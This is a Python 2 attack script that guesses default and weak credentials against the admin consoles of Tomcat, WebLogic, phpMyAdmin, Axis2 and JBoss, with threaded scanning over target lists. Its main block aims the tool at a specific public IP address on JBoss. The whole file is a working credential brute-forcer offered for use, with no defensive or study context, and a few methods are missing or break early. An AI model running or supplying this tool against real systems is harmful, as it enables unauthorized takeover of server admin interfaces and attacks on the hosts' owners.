#coding:utf-8

import os
import sys
import socket
import base64
import time
import requests
import threading
from Queue import Queue


reload(sys)
sys.setdefaultencoding('utf-8')
socket.setdefaulttimeout(10)
mutex = threading.Lock()
path = os.path.join(__file__,'log.txt')

try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass



cracks={
    "tomcat":{        #tomcat 默认尝试5次错误密码会锁定账号的
        'users':['tomcat','manager','apache','admin','root'],
        'passwords':['','tomcat','password','123456','tomcat123','12345678','123456789','admin123','123123','admin888','admin1','administrator','8888888','123123','admin','manager','apache','root']
              },
    "weblogic":{        #weblogic 默认尝试5次错误密码会锁定账号的
        'users':['weblogic'],
        'passwords':['weblogic','password','manager','admin123','123456','Weblogic1','weblogic10','weblogic10g','weblogic11','weblogic11g','weblogic12','weblogic12g','weblogic13','weblogic13g','weblogic123','12345678','123456789','admin888','admin1','administrator','8888888','123123','admin','root','Oracle@123']
                },
    "phpMyAdmin": {
        'users': ['root','test'],
        'passwords': ['root',"123456","root123","test","","test123","test123456"]
                 },
    "axis2":{
        'users': ['axis','admin','manager','root'],
        'passwords':['','axis','axis2','123456','12345678','password','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
                 },
    "jboss":{
        'users': ['admin','manager','jboss','root'],
        'passwords':['','admin','123456','12345678','123456789','admin123','admin888','password','admin1','administrator','8888888','123123','admin','manager','root','jboss']
                },
    "resin":{
        'users': ['admin'],
        'passwords':['admin','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
                },
    "glassfish":{
        'users': ['admin'],
        'passwords':['admin','glassfish','password','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','manager','root']
                },
    }


class MyThread(threading.Thread):
    def __init__(self, func):
        super(MyThread, self).__init__()
        self.func = func
    def run(self):
        self.func()


class Engine():
    def __init__(self):
        pass

    def println(self,url,user,pwd):
        place=" "*5
        mutex.acquire()
        print url,place,user + ":" + pwd
        mutex.release()

    def get_user_pwd(self,users,passwords):
        crack=[]
        for user in users:
            for pwd in passwords:
                crack.append((user,pwd))
        return crack


    def tomcat(self,url):
        print "Now start scaning tomcat....."
        crack=cracks.get("tomcat")
        users_pwds=self.get_user_pwd(crack['users'],crack['passwords'])
        login_url = url + '/manager/html'
        for user,pwd in users_pwds:
            info = base64.b64encode('%s:%s' % (user, pwd))
            header = {'Authorization': 'Basic %s' % info}
            try:
                resp = requests.get(url=login_url, headers=header, timeout=10)
                if resp.status_code == 401:
                    continue
                if resp.status_code == 200:
                    if 'Tomcat Web Application Manager' in resp.content:
                        self.println(login_url, user, pwd)
                        break
                    else:
                        break
                else:
                    break
            except Exception as e:
                break



    def weblogic(self,url):
        print "Now start scaning weblogic....."
        crack=cracks.get("weblogic")
        users_pwds=self.get_user_pwd(crack['users'],crack['passwords'])
        login_url = url + '/console/j_security_check'
        for user, pwd in users_pwds:
            data = {"j_username": user, "j_password": pwd}
            try:
                resp = requests.post(url=login_url, data=data, timeout=10)
                if resp.url.endswith('LoginForm.jsp'):
                    continue
                elif 'console.portal' in resp.url:
                    self.println(login_url, user, pwd)
                    break
                else:
                    break
            except Exception as e:
                break



    def phpmyadmin(self,url):
        print "Now start scaning phpMyAdmin....."
        crack=cracks.get("phpMyAdmin")
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 5.2; rv:49.0) Gecko/20100101 Firefox/49.0',
            'Content-Type': 'application/x-www-form-urlencoded'}
        users_pwds=self.get_user_pwd(crack['users'],crack['passwords'])
        login_url = url.strip('/') + '/phpMyAdmin/index.php'
        for user, pwd in users_pwds:
            auth = 'pma_username=%s&pma_password=%s' % (user, pwd)
            try:
                resp = requests.post(url=login_url, headers=header, data=auth, timeout=20)
                if 'pma_username' in resp.content:
                    continue
                elif 'main.php?token=' in resp.content:
                    self.println(login_url, user, pwd)
                    break
                elif 'db_structure.php?' in resp.content:
                    self.println(login_url, user, pwd)
                    break
            except Exception as e:
                break



    def axis2(self,url):
        print "Now start scaning axis2....."
        crack=cracks.get("axis2")
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 5.2; rv:49.0) Gecko/20100101 Firefox/49.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        flag_list = ['Administration Page</title>', 'System Components', '"axis2-admin/upload"',
                     'include page="footer.inc">', 'axis2-admin/logout']
        users_pwds=self.get_user_pwd(crack['users'],crack['passwords'])
        login_url = url.strip('/') + '/axis2/axis2-admin/login'
        for user, pwd in users_pwds:
            auth = 'userName=%s&password=%s&submit=+Login+' % (user, pwd)
            try:
                resp = requests.post(url=login_url,headers=header,data=auth, timeout=20)
                if "Login to Axis2" in resp.content:
                    continue
                for flag in flag_list:
                    if flag in resp.content:
                        self.println(login_url, user, pwd)
                        break
                    else:
                        break
            except Exception as e:
                if "Connection refused" in str(e):
                    break


    def jboss(self,url):
        print "Now start scaning jboss....."
        crack=cracks.get("jboss")
        users_pwds=self.get_user_pwd(crack['users'],crack['passwords'])
        flag_list = ['>jboss.j2ee</a>', 'JBoss JMX Management Console',
                     'HtmlAdaptor?action=displayMBeans',
                     '<title>JBoss Management']
        login_url = url + '/jmx-console'
        for user,pwd in users_pwds:
            info = base64.b64encode('%s:%s' % (user, pwd))
            header = {'Authorization': 'Basic %s' % info}
            try:
                resp = requests.get(url=login_url, headers=header, timeout=10)
                if resp.status_code == 401:
                    continue
                if resp.status_code == 200:
                    for flag in flag_list:
                        if flag in resp.content:
                            self.println(login_url, user, pwd)
                            break
                    break
                else:
                    break
            except Exception as e:
                break


class Middleware():

    def __init__(self):
        self.targets=[]
        self.tasks_queue = Queue()


    def get_targets(self,_file, url):
        if _file:
            for i in [x.strip() for x in file(_file, 'r')]:
                self.targets.append(i)
        if url:
            self.targets.append(url)
        return len(set(self.targets))


    def worker(self):
        while self.tasks_queue.qsize() > 0:
            type,url=self.tasks_queue.get(timeout=0.1)
            obj=Engine()
            func=getattr(obj,type)
            func(url)


    def monitor(self):
        while not self.tasks_queue.empty():
            print "{} tasks waiting...".format(self.tasks_queue.qsize())
            time.sleep(30)


    def scan(self,_file=None,url=None,type=None,thread=2):
        threads=[]
        self.get_targets(_file, url)
        if type:
            for url in self.targets:
                self.tasks_queue.put((type,url))
            print "Total has %s records to checking..." % (self.tasks_queue.qsize())
            for i in xrange(thread):
                thread = MyThread(self.worker)
                thread.start()
                threads.append(thread)
            self.monitor()
            for thread in threads :
                thread.join()
        else:
            print "what type to crack !!!"


if __name__=="__main__":
    md=Middleware()
    md.scan(url="http://60.208.61.136:8080",type='jboss')
